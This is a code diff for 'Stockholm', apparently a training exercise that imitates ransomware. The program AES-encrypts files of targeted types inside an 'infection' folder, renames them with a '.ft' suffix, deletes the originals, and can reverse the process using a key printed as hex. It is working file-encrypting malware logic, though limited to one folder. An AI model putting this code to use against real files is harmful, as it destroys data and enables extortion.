@@ -1,6 +1,7 @@
 import sys
 from pathlib import Path
 from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 import os
 
 VERSION=0.1
@@ -33,8 +34,8 @@ class StockholmException(Exception):
 class Stockholm():
     home: Path
     infection_dir: Path
-    key: str | None
-    reverse_key: str | None
+    key: bytes | None
+    reverse_key: bytes | None
     help: bool
     version: bool
     reverse: bool
@@ -54,7 +55,7 @@ class Stockholm():
         next_is_key: bool = False
         for arg in argv[1:]:
             if next_is_key:
-                self.reverse_key = arg
+                self.reverse_key = bytes.fromhex(arg)
                 next_is_key = False
             elif arg in FLAGS['help']:
                 self.help = True
@@ -65,31 +66,28 @@ class Stockholm():
                 self.reverse = True
             elif arg in FLAGS['silent']:
                 self.silent = True
-            elif self.key is None:
-                if len(arg) < 16:
-                    raise StockholmException(f"key < 16 character")
-                self.key = arg
             else:
                 raise StockholmException(f"flag not supported")
         if next_is_key:
             raise StockholmException(f"key need for reverse")
-        if self.reverse_key is not None and self.key is not None:
-            raise StockholmException(f"can't crypt and reverse")
+        if not self.reverse:
+            self.key = get_random_bytes(32)
 
-
-    def restore_file(self, path: Path):
-        data: bytes = b""
-        new_path = path.parent / Path(path.stem)
+    def get_relative_file(self, path: Path):
         relative = path
-        new_relative = new_path
         try:
             relative = path.relative_to(self.infection_dir)
         except Exception as err:
             pass
-        try:
-            new_relative = new_path.relative_to(self.infection_dir)
-        except Exception as err:
-            pass
+        return path
+
+    def change_file(self, path: Path, new_path: Path):
+        data: bytes = b""
+        relative = self.get_relative_file(path)
+        new_relative = self.get_relative_file(new_path)
+        key = self.reverse_key if self.reverse else self.key
+        if key is None:
+            raise StockholmException("key not found")
         if not os.access(path, os.W_OK | os.R_OK):
             print(f"{relative} : Can't read or delete file after, so abort")
             return
@@ -102,9 +100,12 @@ class Stockholm():
         except Exception as err:
             print(f"{relative} : {err}")
             return
-        cipher = AES.new(self.reverse_key[:32].encode(), mode=AES.MODE_ECB)
+        cipher = AES.new(key, mode=AES.MODE_ECB)
         data = data + b'\x00' * (16 - len(data) % 16)
-        encrypt_data = cipher.decrypt(data)
+        if self.reverse:
+            encrypt_data = cipher.decrypt(data)
+        else:
+            encrypt_data = cipher.encrypt(data)
         try:
             with open(new_path, 'w+b') as new_file:
                 new_file.truncate(0)
@@ -117,52 +118,9 @@ class Stockholm():
         except Exception as err:
             print(f"{relative} : {err}")
         if not self.silent:
-            print(f"{relative} restore")
+            print(f"{relative} {"restore" if self.reverse else "infected"}")
 
-    def infect_file(self, path: Path):
-        data: bytes = b""
-        new_path = path.with_suffix(''.join(path.suffixes) + '.ft')
-        relative = path
-        new_relative = new_path
-        try:
-            relative = path.relative_to(self.infection_dir)
-        except Exception as err:
-            pass
-        try:
-            new_relative = new_path.relative_to(self.infection_dir)
-        except Exception as err:
-            pass
-        if not os.access(path, os.W_OK | os.R_OK):
-            print(f"{relative} : Can't read or delete file after, so abort")
-            return
-        if new_path.exists():
-            print(f"{new_relative} already exist")
-            return
-        try:
-            with open(path, 'rb') as file:
-                data = file.read()
-        except Exception as err:
-            print(f"{relative} : {err}")
-            return
-        cipher = AES.new(self.key[:32].encode(), mode=AES.MODE_ECB)
-        data = data + b'\x00' * (16 - len(data) % 16)
-        encrypt_data = cipher.encrypt(data)
-        try:
-            with open(new_path, 'w+b') as new_file:
-                new_file.truncate(0)
-                new_file.write(encrypt_data)
-        except Exception as err:
-            print(f"{new_relative} : {err}")
-            return
-        try:
-            os.remove(path)
-        except Exception as err:
-            print(f"{relative} : {err}")
-        if not self.silent:
-            print(f"{relative} infected")
-
-
-    def restore_files(self, root: Path):
+    def iter_files(self, root: Path):
         paths: list[Path] = []
         try:
             paths = root.iterdir()
@@ -171,24 +129,20 @@ class Stockholm():
             return
         for child in paths:
             if child.is_dir():
-                self.restore_files(child)
-            elif child.is_file() and child.suffix == ".ft":
+                self.iter_files(child)
+            elif self.reverse and child.is_file() and child.suffix == ".ft":
                 try:
-                    self.restore_file(child)
-                except Exception as err:
-                    print(f"{child} {err}")
-    def infect_files(self, root: Path):
-        paths: list[Path] = []
-        try:
-            paths = root.iterdir()
-        except Exception as err:
-            print (f"{paths} : {err}")
-            return
-        for child in paths:
-            if child.is_dir():
-                self.infect_files(child)
-            elif child.is_file() and child.suffix != ".ft" and child.suffix in INFECTED_EXTENSION:
-                self.infect_file(child)
+                    new_path = child.parent / Path(child.stem)
+                    self.change_file(child, new_path)
+                except Exception:
+                    continue
+            elif not self.reverse and child.is_file() and child.suffix != ".ft" and child.suffix in INFECTED_EXTENSION:
+                try:
+                    new_path = child.with_suffix(''.join(child.suffixes) + '.ft')
+                    self.change_file(child, new_path)
+                except Exception:
+                    continue
+
 
     def run(self):
         if self.version:
@@ -196,15 +150,20 @@ class Stockholm():
         if self.help:
             show_help()
             return
+        if self.reverse:
+            print(self.reverse_key.hex())
+        else:
+            print(self.key.hex())
         self.infection_dir = self.home / 'infection'
         if not self.infection_dir.exists(follow_symlinks=False):
             raise StockholmException(f"{self.infection_dir} : not exist or is a symlink")
         if not self.infection_dir.is_dir():
             raise StockholmException(f"{self.infection_dir} : not a dir")
-        if self.key is not None:
-            self.infect_files(self.infection_dir)
-        if self.reverse_key is not None:
-            self.restore_files(self.infection_dir)
+        self.iter_files(self.infection_dir)
+        if self.reverse:
+            print(self.reverse_key.hex())
+        else:
+            print(self.key.hex())
 
 def main():
     stockholm = Stockholm(sys.argv)
